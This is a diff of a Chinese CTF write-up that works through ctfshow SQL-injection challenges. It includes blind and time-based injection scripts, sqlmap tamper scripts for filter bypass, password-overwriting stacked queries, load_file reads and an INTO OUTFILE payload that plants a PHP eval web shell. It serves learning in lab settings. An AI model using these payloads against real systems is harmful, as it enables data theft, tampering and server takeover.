@@ -5,7 +5,8 @@ categories:
 - [CTF做题记录]
 - [总结]
 ---
-只记录一些tick，不是wp
+
+~~只记录一些tick，不是wp~~随便写写
 >PHP文档中使用的伪类型与变量
 >- `mixed` --> 说明一个参数可以接受多种不同的（但不一定是所有的）类型
 例如 gettype() 可以接受所有的 PHP 类型，str_replace() 可以接受字符串和数组
@@ -628,10 +629,15 @@ for i in range(1,50):
             print(flag)
             break
 ```
+
 ## web176-179
+sql：`$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";`\
+waf未知\
 payload：`URL/api/?id='or(1)%23`通杀
+
 ## web180
 payload：`URL/api/?id='or(mid(username,1,1)='f')and'1'='1`
+
 ## web181 | 182
 sql语句：`$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";`\
 waf：`preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i', $str)`\
@@ -818,9 +824,75 @@ sql：`$sql = "select pass from ctfshow_user where username = {$username}";`
     }
 ```
 先上payload：`username=1<1&password=0`阿狸师傅tql，逻辑运算符从左到右，所以username只有0|1，也就是相当于`where username!=1`，pass为0是因为密码比较为弱类型，字符串被转为0\
-群主思路：into file写马，但是需要知道绝对路径，(⊙﹏⊙)等我会了来填坑\
-给大佬递茶：username=\`username\`/\`pass\`&pass=0即可登陆
+@群主思路：into file写马，但是需要知道绝对路径，(⊙﹏⊙)等我会了来填坑\
+@给大佬递茶：username=\`username\` 或者 \`pass\`&pass=0即可登陆
+
 ## web189
+sql: `$sql = "select pass from ctfshow_user where username = {$username}";`\
+```php
+//waf
+//用户名检测
+if(preg_match('/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i', $username)){
+$ret['msg']='用户名非法';
+die(json_encode($ret));
+}
+
+//密码检测
+if(!is_numeric($password)){
+$ret['msg']='密码只能为数字';
+die(json_encode($ret));
+}
+
+//密码判断
+if($row['pass']==$password){
+    $ret['msg']='登陆成功';
+}
+```
+说是flag在api/index.php文件中，R1chm0nd大佬hint：`load_file`，感谢R1师傅和群内大师傅们的思路，在此给出垃圾脚本，线程崩了改i=251\
+本次也学到很多，MySQL里面竟然还有定位函数
+>MySQL定位函数（暂时只收集到这几个）：
+>- `INSTR(str,substr)` --> 返回字符串 str 中子字符串的第一个出现位置，否则为0
+>- `FIND_IN_SET(str,strlist)` --> 返回字符串 str 中子字符串的第一个出现位置，否则为0
+>- `LOCATE(substr,str,pos)` --> 返回字符串 str中子字符串substr的第一个出现位置, 起始位置在pos。如若substr 不在str中，则返回值为0
+>- `POSITION(substr IN str)` --> 返回子串 substr 在字符串 str 中第一次出现的位置。如果子串 substr 在 str 中不存在，返回值为 0
+
+```python
+# encoding:     utf-8
+# @Author:      yq1ng
+# @Date:        2020-11-27 19:00
+# @challenges： web189
+
+import requests
+
+url = "http://460ff67c-68fc-486d-bbaf-cab2c0e2dec3.chall.ctf.show/api/index.php"
+data = {"password":"111", "username":""}
+i = 0
+flag = ""
+
+while True:
+    i += 1
+    payload = 'concat("user",if((INSTR(load_file("/var/www/html/api/index.php"),"flag{")=%d),1,0))'% i
+    data["username"] = payload
+    s = requests.post(url, data = data)
+    print(data)
+    if "529f" in s.text:
+        break
+
+while True:
+    for x in 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}':
+        payload = 'concat("user",if((mid(load_file("/var/www/html/api/index.php"),%d,1)="%c"),1,0))'% (i,x)
+        data["username"] = payload
+        s = requests.post(url, data = data)
+        print(data)
+        if "529f" in s.text:
+            flag += x
+            break
+    if "}" in flag:
+        break
+    i += 1
+    print(flag)
+print("Give you flag :"+flag)
+```
 
 ## web190 - 194
 sql: `$sql = "select pass from ctfshow_user where username = '{$username}'";`
@@ -1032,6 +1104,7 @@ if($row[0]==$password){
     $ret['msg']="登陆成功 flag is $flag";
 }
 ```
+这题记录的有点迷了，师傅们仅作参考，搞不懂当时咋想的了，应该直接更密码就可以了\
 开始用的``admin;update`ctfshow_user`set`pass`=1;``，一直不对，想了想，字符串需要引号啊，引号又被ban了，所以改用户名为数字就好\
 payload:``1;update`ctfshow_user`set`username`=1;`` `password=1`，不能登录的话就把pass也更新为1``1;update`ctfshow_user`set`pass`=1;``
 
@@ -1056,6 +1129,23 @@ waf:
 ```
 这题略坑，说是过滤`select`但是没过滤，直接`1;select(1)` pass: `1`过了\
 用户名没有为1的，所以返回的结果集是后面的，不用纠结`$row[0]==$password`
+
+## web197 - 200
+拼接sql：`$sql = "select pass from ctfshow_user where username = {$username};";`
+
+```php
+//waf
+//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
+if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(|\,/i', $username)){
+$ret['msg']='用户名非法';
+die(json_encode($ret));
+}
+
+if($row[0]==$password){
+    $ret['msg']="登陆成功 flag is $flag";
+}
+```
+通杀非预期（骚气阿狸大佬的思路）：username:`1;show tables;`，pass:`ctfshow_user`，能做到这应该也懂原理
 
 ## web201
 ~~玩会sqlmap，189往后先搁置了哈哈哈哈，系列题目，直接dump了~~\
@@ -1121,6 +1211,7 @@ column: `--dbms=mysql -D ctfshow_web -T ctfshow_flaxc --dump --batch --prefix="'
 - 开始判断内容了，似乎是二分法\
   `id=1') AND 2696=IF((ORD(MID((SELECT IFNULL(CAST(flagv AS CHAR),0x20) FROM ctfshow_web.ctfshow_flaxc ORDER BY flagv LIMIT 0,1),1,1))>151259),SLEEP(5),2696)and ('y')=('y`\
 我能看懂的流程也就这么多，应该会有借鉴payload的时候，前面七七八八的pl真是不懂，response也没东西，不晓得sqlmap是在干嘛，但应该是有用的，有兴趣可以抓包搜一下pl
+
 ## web207
 >`--tamper` 的初体验\
 waf：`preg_match('/ /', $str)`\
@@ -1136,8 +1227,412 @@ flag: `  -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump`最后加了个`--thr
 ## web208
 >`$id = str_replace('select', '', $id);`\
 `preg_match('/ /', $str)`
+```php
+//对传入的参数进行了过滤
+// $id = str_replace('select', '', $id);
+  function waf($str){
+   return preg_match('/ /', $str);
+  }
+```
+继续加载荷，过滤了`select`和空格\
+因为校园网+代理问题，一直302，故sqlmap暂时搁置，以后有机会再写，可以先看[Y4大佬的博客](https://y4tacker.blog.csdn.net/article/details/110144623)\
+[11.29补]: 怎么说呢，出题人失误，select未匹配大小写，所以和上一题一样。。。因为sqlmap跑的关键字全是大写的根本匹配不到哈哈哈
 
-继续加载荷，过滤了`select`和空格
+## web209
+sql：`$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 0,1;";`\
+waf: `preg_match('/ |\*|\=/', $str);`\
+like代替=，自己写tamper，基础教程[点此](https://y4er.com/post/sqlmap-tamper/)，一开始照着sqlmap自带的tamper魔改了一下发现，database和tables、columns都可以跑出来，但是flag不能出，又去参考Y4大佬的博客，okk更改过程写在代码里了\
+最终payload：` py2 .\sqlmap.py -u "http://aad8992e-a4a8-4c56-9921-fa1277ac5427.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://aad8992e-a4a8-4c56-9921-fa1277ac5427.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web209" --prefix="'" --dbms=mysql -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump --batch`
+```python
+# encoding:     utf-8
+# @Author:      yq1ng
+# @Date:        2020-11-29 15:10
+# @challenges： web209
+
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.NORMAL # 当前脚本调用优先等级
+
+def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。
+	pass
+
+def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数
+    payload = web209(payload)
+    return payload
+
+def web209(payload):
+    retVal = payload
+
+    if payload:
+        retVal = ""
+        quote, doublequote, firstspace = False, False, False
+
+        for i in xrange(len(payload)):
+            if not firstspace:
+                if payload[i].isspace():
+                    firstspace = True
+                    retVal += chr(0x0a)
+                    continue
+
+            elif payload[i] == '\'':
+                quote = not quote
+
+            elif payload[i] == '"':
+                doublequote = not doublequote
+
+            elif payload[i] == "=":
+                retVal += chr(0x0a)+"like"+chr(0x0a)
+                continue
+
+            elif payload[i] == "*":
+                #retVal += chr(0x79)//跑flag发现不能用字母，GG
+                retVal += chr(0x31)
+                continue
+
+            elif payload[i] == " " and not doublequote and not quote:
+                retVal += chr(0x0a)
+                continue
+
+            retVal += payload[i]
+
+    return retVal
+```
+
+## web210
+sql：`$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 0,1;";`\
+return: `return strrev(base64_decode(strrev(base64_decode($id))));` --> 先解码再字符反转再解码再字符反转\
+编写tamper思路：反转->编码->反转->编码。参照自带脚本`base64encode.py`\
+最终payload：`py2 .\sqlmap.py -u "http://f0d17799-5320-4b1f-9e76-42fc7fc5bf3d.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://f0d17799-5320-4b1f-9e76-42fc7fc5bf3d.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web210" --dbms=mysql -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch`
+```python
+# encoding:     utf-8
+# @Author:      yq1ng
+# @Date:        2020-11-29 16:20
+# @challenges： web210
+
+import base64
+
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.NORMAL # 当前脚本调用优先等级
+
+def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。
+	pass
+
+def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数
+    payload = web210(payload)
+    return payload
+
+def web210(payload):
+    retVal = payload
+
+    if payload:
+        retVal = base64.b64encode(payload[::-1].encode("utf-8"))
+        retVal = base64.b64encode(retVal[::-1].encode("utf-8"))
+
+    return retVal
+```
+## web211
+在上一题基础上过滤了空格，好说，加上一行替换\
+最终payload：`py2 .\sqlmap.py -u "http://5773f437-30b9-4c52-a029-ebbffa67f89a.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://5773f437-30b9-4c52-a029-ebbffa67f89a.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web211" --dbms=mysql -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump --batch`
+```python
+# encoding:     utf-8
+# @Author:      yq1ng
+# @Date:        2020-11-29 16:20
+# @challenges： web211
+
+import base64
+
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.NORMAL # 当前脚本调用优先等级
+
+def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。
+	pass
+
+def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数
+    payload = web211(payload)
+    return payload
+
+def web211(payload):
+    retVal = payload
+
+    if payload:
+        payload = payload.replace(" ","/**/")
+        retVal = base64.b64encode(payload[::-1].encode("utf-8"))
+        retVal = base64.b64encode(retVal[::-1].encode("utf-8"))
+
+    return retVal
+```
+
+## web212
+211基础过滤*，似曾相识？对！209的tamper加上！\
+最终payload：`py2 .\sqlmap.py -u "http://fe5aacfa-02d5-4596-a385-7bf1a7a3bca1.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://fe5aacfa-02d5-4596-a385-7bf1a7a3bca1.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web212" --dbms=mysql -D ctfshow_web -T ctfshow_flavis -C ctfshow_flagxsa --dump --batch`
+```python
+# encoding:     utf-8
+# @Author:      yq1ng
+# @Date:        2020-11-29 17:00
+# @challenges： web212
+
+import base64
+
+from lib.core.enums import PRIORITY
+__priority__ = PRIORITY.NORMAL # 当前脚本调用优先等级
+
+def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。
+	pass
+
+def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数
+    payload = web209(payload)
+    payload = web212(payload)
+    return payload
+
+def web212(payload):
+    retVal = payload
+
+    if payload:
+        retVal = base64.b64encode(payload[::-1].encode("utf-8"))
+        retVal = base64.b64encode(retVal[::-1].encode("utf-8"))
+
+    return retVal
+
+def web209(payload):
+    retVal = payload
+
+    if payload:
+        retVal = ""
+        quote, doublequote, firstspace = False, False, False
+
+        for i in xrange(len(payload)):
+            if not firstspace:
+                if payload[i].isspace():
+                    firstspace = True
+                    retVal += chr(0x0a)
+                    continue
+
+            elif payload[i] == '\'':
+                quote = not quote
+
+            elif payload[i] == '"':
+                doublequote = not doublequote
+
+            elif payload[i] == "=":
+                retVal += chr(0x0a)+"like"+chr(0x0a)
+                continue
+
+            elif payload[i] == "*":
+                retVal += chr(0x31)
+                continue
+
+            elif payload[i] == " " and not doublequote and not quote:
+                retVal += chr(0x0a)
+                continue
+
+            retVal += payload[i]
+
+    return retVal
+```
+
+## web213
+任务：`练习使用--os-shell 一键getshell`\
+参考：https://zhuanlan.zhihu.com/p/58007573
+1. 查看当前注入点数据库权限是否为dba\
+   `py2 .\sqlmap.py -u "http://f35926e1-d8ff-419a-991b-12df1eb20362.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://f35926e1-d8ff-419a-991b-12df1eb20362.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web212" --dbms=mysql --is-dba --batch`\
+    ```
+    [17:23:47] [INFO] retrieved: root@localhost
+    current user is DBA: True
+    ```
+2. 寻找绝对路径\
+   `py2 .\sqlmap.py -u "http://f35926e1-d8ff-419a-991b-12df1eb20362.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://f35926e1-d8ff-419a-991b-12df1eb20362.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web212" --dbms=mysql --sql-shell --batch`\
+   `select @@datadir;` --> 数据库绝对路径 --> `/var/lib/mysql/`\
+   `select @@basedir;` --> MySql安装路径 --> `/usr`
+3. getshell\
+   失败了，等着填坑，提示根目录不对。。
+
+## web214
+[11.29补]: 忘了214是时间盲注了，我以为是sqlmap，215脚本拿来用，不过是数字型注入，payload：`-1 or(if(left((select %s from %s),%d)='%s',sleep(3),1))`，还是要多跑两边，强烈建议`left()`截取函数，懒得改下面的了，参考表名：`ctfshow_flagx`，参考列名：`flaga`
+
+## web215
+提示查询给了单引号，其他全没有，真就闭着眼睛注呗，由于是先做的233，结果直接拿来用了，一个字：慢！！！太慢了！~~有时flag不准~~，跑了228S。。。学着写线程了，估计明天才能出了，这两天课多呜呜呜。我回来了，太菜了写不出来，进程锁加上又太慢，师傅们写了请务必让本菜鸡参考一下，在此非常感谢师傅
+```python
+# encoding:     utf-8
+# @Author:      yq1ng
+# @Date:        2020-11-25 21:00
+# @challenges： web215
+
+import requests
+
+url = "http://31bee14e-12a1-4dff-89f1-60ba46a1baaa.chall.ctf.show/api/index.php"
+data = {"debug":1, "ip":""}
+tb_name = ''
+column_name = ''
+flag = ''
+
+for i in range(1,100):
+    for j in r'ctfshow_abdegijklmnopqruvxyz-,1234567890!':
+        payload = "-1'or(if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%c',sleep(3),1))and'1'='1"% (i,j)
+        data["ip"] = payload
+        #print(data)
+        r = requests.post(url, data = data)
+        time = r.elapsed.total_seconds()
+        #print(time)#获取响应时间
+        if time > 2:
+            tb_name += j
+            break
+    print("\r[+]table name is %s"% tb_name, end = '')
+    if j == "!":
+        break
+
+guess_tbName = input("\nPlease enter the name of the table you want to guess: ")
+#column_name
+for i in range(1,100):
+    for j in r'abcdefghijklmnopqrstuvwxyz_,1234567890!':
+        payload = "-1'or(if(substr((select group_concat(column_name) from information_schema.columns where table_name='%s'),%d,1)='%c',sleep(3),1))and'1'='1"% (guess_tbName,i,j)
+        data["ip"] = payload
+        #print(data)
+        r = requests.post(url, data = data)
+        time = r.elapsed.total_seconds()
+        #print(time)#获取响应时间
+        if time > 2:
+            column_name += j
+            break
+    print("\r[+]The column name in the %s table is %s"%(guess_tbName,column_name), end = '')
+    if j == "!":
+        break
+
+guess_flag = input("\n\nOkay, we're getting a flag. Tell me the list:")
+#flag
+print("\nGetting the flag......")
+for i in range(1,100):
+    for j in r'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}':
+        payload = "-1'or(if(substr((select %s from %s),%d,1)='%c',sleep(3),1))and'1'='1"% (guess_flag,guess_tbName,i,j)
+        data["ip"] = payload
+        #print(data)
+        r = requests.post(url, data = data)
+        time = r.elapsed.total_seconds()
+        #print(time)#获取响应时间
+        if time > 2:
+            flag += j
+            break
+    print("\r[+]The flag is %s"% flag,end = '')
+    if j == "}":
+        break
+```
+
+## web216
+和215一样，改改pl：`'MQ==')or(if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%c',sleep(2),1)`，看了[Y4师傅的脚本](https://y4tacker.blog.csdn.net/article/details/110144623)，不会，呜呜呜，看都看不懂，俺菜死了，建议看看Y4师傅的，俺的遍历跑了4min，Y4师傅的脚本建议多跑两边，我跑了三次，三次都不一样
+
+## web217
+sql: `where id = ($id);`
+```php
+//waf
+    //屏蔽危险分子
+    function waf($str){
+        return preg_match('/sleep/i',$str);
+    } 
+```
+时间盲注除了`sleep()`还有`BENCHMARK()`，所以把pl的`sleep(2)`换成`BENCHMARK(3500000,md5('yq1ng')`即可，这个猜测正确返回时间为2.35S，本地测试很快，一开始传的返回9S，计算了一下取了其1/4值
+>`BENCHMARK(n, exp)` --> 测试一些函数的执行速度\
+参数介绍：第一个是执行的次数，第二个是要执行的函数或者是表达式\
+eg:`BENCHMARK(3500000,md5('yq1ng')`测试md5加密yq1ng 3500000次的时间，依次来达到延时效果
+
+## web218
+好家伙，在上一题基础上过滤了`BENCHMARK()`，不过还能用笛卡尔积去达到延时效果，参见[此博客](https://www.cnblogs.com/c1e4r/articles/9060525.html)，将`BENCHMARK()`改为`(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E, information_schema.schemata F)`即可，延时为1S，可以自己先测测再用
+
+## web219
+这次屏蔽了`rlike`，上题思路应该是用正则匹配来达到延时效果，例如：`select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');`，本地测试出现`ERROR 3699 (HY000): Timeout exceeded in regular expression match.`，故未使用，本方法参见[MySQL时间盲注五种延时方法](https://www.cdxy.me/?p=789)\
+还是上题脚本，给个参考，表名：`ctfshow_flagxca`，列名：`flagaabc`，flag一共42位，格式：`flag{3b75b8d2-fe1b-4e47-a2db-70cc9c8e2091}`，一遍可能不成功，多试几次，我试了六七次呜呜呜，再也不想做时间盲注了，截取单个字符一直不行可以试试`left()`每次截取少量字符串，多试几次，奥里给\
+给出参考表名：`ctfshow_flagxcac`，列名：`flagaabcc`
+
+## web220
+最后一题盲注了，过滤挺多：`preg_match('/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i',$str);`看来上一题的姿势挺多的，俺想不出来预期解，所以还是上一题脚本，等群主出预期，占坑
+
+## web221
+sql：`$sql = select * from ctfshow_user limit ($page-1)*$limit,$limit;`\
+无过滤，提示：`//拿到数据库名字就算你赢`\
+参考[P牛文章](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)\
+在`LIMIT`后面可以跟两个函数，`PROCEDURE` 和 `INTO`，into需要写权限，一般不常见，但是`PROCEDURE`在msyql5.7以后已经弃用，8.0直接删除了。。。[官方文档在此](https://www.docs4dev.com/docs/zh/mysql/5.7/reference/procedure-analyse.html)\
+payload：`URL/api/?page=1&limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)`，数据库名就是flag
+
+## web222 | 223
+我的脚本删了，幸好space man师傅还留着，在此感谢
+```python
+# encoding: utf-8
+# @Author:  yq1ng
+# @Date:    2020-11-17 17:30
+
+import requests
+import time
+
+url = input("Okay, Input your url: ")
+
+tb_name = ''
+all_column_len=0
+column_name = ''
+flag = ''
+
+def creat_num(n):
+    ret = "y"
+    if n == 0:
+        ret = ""
+    elif n == 1:
+        return ret
+    else:
+        for x in range(n-1):
+            ret += "y"
+    return ret
+
+
+#table_name
+print("\nGetting the table name...")
+for x in range(1,100):# 不晓得有多少，尽量大喽，当然，while true也行
+    for y in r'ctfshow_abdegijklmnopqruvxyz-,0123456789!':# 根据命名规则，表名是不会有！的，所以嘿嘿
+        payload = '?u=id having (select mid(group_concat(table_name),length("%s"),length("y")) from information_schema.tables where table_schema=database())="%c"'% (creat_num(x),y)
+        r = requests.get(url + payload)
+        if r"\u67e5\u8be2\u6210\u529f" in r.text:
+            tb_name += y
+            break
+    print("\r[+]table name is %s"% tb_name, end = '')
+    if y == "!":
+        break
+print("\n\nDone!The table names in this database are：",tb_name)
+
+guess_tbName = input("\nPlease enter the name of the table you want to guess: ")
+#column_name
+for x in range(1,100):
+    for y in r'abcdefghijklmnopqrstuvwxyz_,!':
+        payload = '?u=id having (select mid(group_concat(column_name),length("%s"),length("y")) from information_schema.columns where table_name="%s")="%c"'% (creat_num(x),guess_tbName,y)
+        r = requests.get(url + payload)
+        #print(payload)
+        if r"\u67e5\u8be2\u6210\u529f" in r.text:
+            column_name += y
+            break
+    print("\r[+]The column name in the %s table is %s"%(guess_tbName,column_name), end = '')
+    if y == "!":
+        break
+
+guess_flag = input("\n\nOkay, we're getting a flag. Tell me the list:")
+
+for x in range(1,100):
+    payload = '?u=id having (select mid(group_concat(%s),length("%s"),length("y")) from %s) REGEXP "[a-z]|{|}|-"'% (guess_flag,creat_num(x),guess_tbName)
+    r = requests.get(url + payload)
+    #print(payload)
+    if r"\u67e5\u8be2\u6210\u529f" in r.text:
+        for y in r'flag{bcde-hijkmnopqrstuvwxyz}':
+            payload = '?u=id having (select mid(group_concat(%s),length("%s"),length("y")) from %s)="%c"'% (guess_flag,creat_num(x),guess_tbName,y)
+            r = requests.get(url + payload)
+            #print(payload)
+            if r"\u67e5\u8be2\u6210\u529f" in r.text:
+                flag += y
+                break
+    else:
+        for y in r'1234567890':
+            payload = '?u=id having (select mid(group_concat(%s),length("%s"),length("y")) from %s)=length("%s")'% (guess_flag,creat_num(x),guess_tbName,creat_num(int(y)))
+            r = requests.get(url + payload)
+            #print(payload)
+            if r"\u67e5\u8be2\u6210\u529f" in r.text:
+                flag += y
+                break
+    print("\r[+]The flag is %s"% flag,end = '')
+    if "}" in flag:
+        break
+```
 
 ## web224
 >[Y1ng](https://www.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5)大师傅博客
@@ -1244,6 +1739,7 @@ flag: `',username=(select yq1ng.a from (select group_concat(flagas)a from flaga)
 # encoding: utf-8
 # @Author:  yq1ng
 # @Date:    2020-11-20 23:00
+
 import requests
 
 url = "http://059e89aa-6633-4b85-a554-dea3e2b48d9a.chall.ctf.show/api/"
@@ -1299,6 +1795,221 @@ for i in range(1,100):
             flag += j
             break
     print("\r[+]The flag is %s"% flag,end = '')
-    if j == "!":
+    if j == "}":
         break
 ```
+
+## web234
+sql：`$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";`\
+说是没过滤，其实单引号没了。。。永远不要相信出题人的话，在[BJDCTF 2nd的简单注入](https://yq1ng.github.io/z_post/BJDCTF-2nd%20WEB/#bjdctf-2nd%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5)一题中提到过单引号逃逸，当输入的pass为`\`时，sql语句变为：`update ctfshow_user set pass = '\' where username = 'user1';`，此时pass为`where username = `实现单引号逃逸\
+payload：查表：`password=\&username=,username=(select group_concat(table_name) from information_schema.columns where table_schema=database())#`，注意，这会把所有的user和pass全部改掉，实际注入加上where或者盲注\
+查列：`password=\&username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#`\
+flag：`password=\&username=,username=(select flagass23s3 from flag23a)#`
+
+## web235
+过滤` or ' `\
+这题。。上面的information带or，参考[bypass information](https://blog.csdn.net/qq_45521281/article/details/106647880)
+表名：`password=\&username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#` 只有这个成了，其他的没成功\
+列名不得行，其他库中并未存储列名，还有办法：无列名注入，上面的博客也有写，payload：``password=\&username=,username=(select `2` from (select 1,2,3 union select * from flag23a1 limit 1,1)y)#``，其实[GYCTF2020 Ezsqli](https://yq1ng.github.io/z_post/GYCTF2020%E9%83%A8%E5%88%86WEB/#gyctf2020ezsqli)就已经写过了
+
+## web236
+增加过滤`flag`，棒棒哒\
+表名和上题一样，测试了`password=flag&username=banlist,ctfshow_user,flaga`可以把密码改为flag，也就是输出过滤。。。我以为是输入过滤\
+输出编码，前几关就是这么过的payload：``password=\&username=,username=(select hex(`2`) from (select 1,2,3 union select * from flaga limit 1,1)y)#``
+
+## web237
+sql: `$sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";`，无过滤\
+注意：insert盲注会产生大量数据\
+api下插入不得行，抓包发现是在`URL/api/insert.php`下\
+表名：`username=yq1ng',(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&password=yq1ng`\
+列名：`username=yq1ng',(select group_concat(column_name) from information_schema.columns where table_name='flag'))#&password=yq1ng`\
+flag: `username=yq1ng',(select group_concat(flagass23s3) from flag))#&password=yq1ng`
+
+## web238
+过滤空格\
+那就不用呗，前面的老套路，括号淦，表名：`username=yq1ng',(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))#&password=yq1ng`\
+列名：`username=yq1ng',(select(group_concat(column_name))from(information_schema.columns)where(table_name='flagb')))#&password=yq1ng`\
+flag: `username=yq1ng',(select(group_concat(flag))from(flagb)))#&password=yq1ng`
+
+## web239
+增加过滤`or`\
+这是又过了一遍？前面的无列名注入？什么你忘了？回去看看web235！\
+表名：`username=yq1ng',(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&password=yq1ng`\
+列名：占坑，试了没弄出来\
+flag: `username=yq1ng',(select(group_concat(flag))from(flagbb)))#&password=yq1ng`，猜的。。。
+
+## web240
+sql：`$sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";`\
+waf: `空格 or sys mysql`\
+Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写\
+就这过滤，，，全靠运气解法，后五位只有ab，一共32中情况，确定了，是个算法题目，跑完去`URL/page.php`最后一页看看，要是100次还没出说明你也太黑了哈哈哈，脚本参考[Y4师傅](https://y4tacker.blog.csdn.net/article/details/110144623)
+```python
+# encoding:     utf-8
+# @Author:      yq1ng
+# @Date:        2020-11-29 23:00
+# @challenges： web240
+
+import requests
+import random
+
+url = "http://d140c93f-746e-41d4-a13e-02c42e17237d.chall.ctf.show/api/insert.php"
+data = {'username': "", 'password': ''}
+
+def TableName():
+    values = "ab"
+    table = [random.choice(values) for i in range(5)]
+    tableName = ''.join(table)
+    return tableName
+
+for x in range(1,100):
+    data["username"] = f"yq1ng',(select(flag)from(flag{TableName()})))#"
+    s = requests.post(url, data = data)
+    print(data)
+```
+
+## web241
+无过滤的delete注入，基于时间盲注，表的内容不要太多，因为返回时间是`sleep(x)*条数`（flag不对建议再跑一次，或者不急的话可以增加时间，因为服务器响应可能有时候比较慢）
+
+payload：`URL/api/delete.php` 爆表：`-1 or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%c',sleep(1),0)`，其他的就是正常注入，改一下if条件就好
+
+注意，if最后条件为0，不然直接把表清空了hhh
+
+## web242
+sql：`$sql = "select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';";`
+
+无过滤
+
+介绍一下`into outfile`
+>1. 介绍：
+ SELECT INTO…OUTFILE语句把表数据导出到一个文本文件中，并用LOAD DATA …INFILE语句恢复数据。但是这种方法只能导出或导入数据的内容，不包括表的结构，如果表的结构文件损坏，则必须先恢复原来的表的结构。也可以将查询结果保存在变量中。
+ 2. 语法：
+    ```php
+    SELECT ... INTO OUTFILE 'file_name'
+            [CHARACTER SET charset_name]
+            [export_options]
+    
+    export_options:
+        [{FIELDS | COLUMNS}
+            [TERMINATED BY 'string']//分隔符
+            [[OPTIONALLY] ENCLOSED BY 'char']
+            [ESCAPED BY 'char']
+        ]
+        [LINES
+            [STARTING BY 'string']
+            [TERMINATED BY 'string']
+        ]
+    ```
+
+    “OPTION”参数为可选参数选项，其可能的取值有：
+
+    `FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。
+
+    `FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。
+
+    `FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。
+
+    `FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。
+
+    `LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。
+
+    `LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
+
+`FIELDS`和`LINES`两个子句都是自选的，但是如果两个子句都被指定了，FIELDS必须位于LINES的前面。
+
+所以，利用分隔符进行写shell
+
+payload：`URL/api/dump.php`\
+`filename=yq1ng.php' lines terminated by 0x273C3F70687020406576616C28245F504F53545B277971316E67275D293B3F3E27'` --> `'<?php @eval($_POST['yq1ng']);?>'`
+
+## web243
